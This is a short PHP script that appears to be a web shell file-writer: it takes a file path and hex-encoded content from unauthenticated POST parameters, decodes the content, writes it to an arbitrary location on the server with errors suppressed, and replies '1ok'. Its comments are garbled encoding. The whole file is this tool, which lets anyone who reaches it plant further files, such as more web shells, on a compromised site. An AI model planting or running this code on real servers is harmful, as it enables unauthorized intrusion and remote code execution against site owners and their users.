<?php 
$f=realpath(dirname(__FILE__)."/../").$_POST["z1"]; //ļ·
$c=$_POST["z2"];$buf=""; //z2ȡݵc,ʼbuf
for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2)); //ƴѭ,cύ
@fwrite(fopen($f,"w"),$buf); echo "1ok"; //ļ
?>